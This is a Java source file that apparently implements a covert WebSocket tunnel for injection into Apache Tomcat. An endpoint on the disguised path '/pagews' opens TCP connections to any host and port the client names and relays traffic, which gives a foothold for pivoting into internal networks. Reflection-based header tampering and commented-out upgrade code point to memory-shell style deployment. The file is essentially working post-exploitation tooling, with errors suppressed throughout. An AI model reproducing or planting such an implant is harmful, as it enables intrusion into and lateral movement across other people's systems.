package com.sf.sl;

import javax.websocket.Endpoint;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.HashMap;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import javax.websocket.*;

public class WS {
    private static final String pathPattern= "/pagews";
    public static class ProxyEndpoint extends Endpoint {
        long i =0;
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        HashMap<String, AsynchronousSocketChannel> map = new HashMap<String,AsynchronousSocketChannel>();
        static class Attach {
            public AsynchronousSocketChannel client;
            public Session channel;
        }
        void readFromServer(Session channel,AsynchronousSocketChannel client){
            final ByteBuffer buffer = ByteBuffer.allocate(50000);
            Attach attach = new Attach();
            attach.client = client;
            attach.channel = channel;
            client.read(buffer, attach, new CompletionHandler<Integer, Attach>() {
                @Override
                public void completed(Integer result, final Attach scAttachment) {
                    buffer.clear();
                    try {
                        if(buffer.hasRemaining() && result>=0)
                        {
                            byte[] arr = new byte[result];
                            ByteBuffer b = buffer.get(arr,0,result);
                            baos.write(arr,0,result);
                            ByteBuffer q = ByteBuffer.wrap(baos.toByteArray());
                            if (scAttachment.channel.isOpen()) {
                                scAttachment.channel.getBasicRemote().sendBinary(q);
                            }
                            baos = new ByteArrayOutputStream();
                            readFromServer(scAttachment.channel,scAttachment.client);
                        }else{
                            if(result > 0)
                            {
                                byte[] arr = new byte[result];
                                ByteBuffer b = buffer.get(arr,0,result);
                                baos.write(arr,0,result);
                                readFromServer(scAttachment.channel,scAttachment.client);
                            }
                        }
                    } catch (Exception ignored) {}
                }
                @Override
                public void failed(Throwable t, Attach scAttachment) {t.printStackTrace();}
            });
        }
        void process(ByteBuffer z,Session channel)
        {
            try{
                if(i>1)
                {
                    AsynchronousSocketChannel client = map.get(channel.getId());
                    client.write(z).get();
                    z.flip();
                    z.clear();
                }
                else if(i==1)
                {
                    String values = new String(z.array());
                    String[] array = values.split(" ");
                    String[] addrarray = array[1].split(":");
                    AsynchronousSocketChannel client = AsynchronousSocketChannel.open();
                    int po = Integer.parseInt(addrarray[1]);
                    InetSocketAddress hostAddress = new InetSocketAddress(addrarray[0], po);
                    Future<Void> future = client.connect(hostAddress);
                    try {
                        future.get(10, TimeUnit.SECONDS);
                    } catch(Exception ignored){
                        channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                        return;
                    }
                    map.put(channel.getId(), client);
                    readFromServer(channel,client);
                    channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
                }
            }catch(Exception ignored){
            }
        }
        @Override
        public void onOpen(final Session session, EndpointConfig config) {
            i=0;
            session.setMaxBinaryMessageBufferSize(1024*1024*20);
            session.setMaxTextMessageBufferSize(1024*1024*20);
            session.addMessageHandler(new MessageHandler.Whole<ByteBuffer>() {
                @Override
                public void onMessage(ByteBuffer message) {
                    try {
                        message.clear();
                        i++;
                        process(message,session);
                    } catch (Exception ignored) {
                    }
                }
            });
        }
    }

    public static void SetHeader(Object request, String key, String value){
        Class requestClass = request.getClass();
        try {
            Field requestField = requestClass.getDeclaredField("request");
            requestField.setAccessible(true);
            Object requestObj = requestField.get(request);
            Field coyoteRequestField = requestObj.getClass().getDeclaredField("coyoteRequest");
            coyoteRequestField.setAccessible(true);
            Object coyoteRequestObj = coyoteRequestField.get(requestObj);
            Field headersField = coyoteRequestObj.getClass().getDeclaredField("headers");
            headersField.setAccessible(true);
            Object headersObj = headersField.get(coyoteRequestObj);
            headersObj.getClass().getMethod("removeHeader", String.class).invoke(headersObj, key);
            Object x = headersObj.getClass().getMethod("addValue", String.class).invoke(headersObj, key);
            x.getClass().getMethod("setString", String.class).invoke(x, value);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void doService(Object obj, String url,String method, java.io.InputStream in) {
        if (url.matches(pathPattern)) {
//            try {
//                com.sf.sl.WS.SetHeader(request,"Connection","upgrade");
//                com.sf.sl.WS.SetHeader(request,"Sec-WebSocket-Version","13");
//                com.sf.sl.WS.SetHeader(request,"Upgrade","websocket");
//                javax.websocket.server.ServerEndpointConfig configEndpoint = javax.websocket.server.ServerEndpointConfig.Builder.create(com.sf.sl.WS.ProxyEndpoint.class, "/x").build();
//                org.apache.tomcat.websocket.server.WsServerContainer container = (org.apache.tomcat.websocket.server.WsServerContainer) request.getSession().getServletContext().getAttribute("javax.websocket.server.ServerContainer");
//                org.apache.tomcat.websocket.server.UpgradeUtil.doUpgrade(container, request, response, configEndpoint, java.util.Collections.emptyMap());
//            } catch (Exception ignored) {
//            }
        }
    }

}
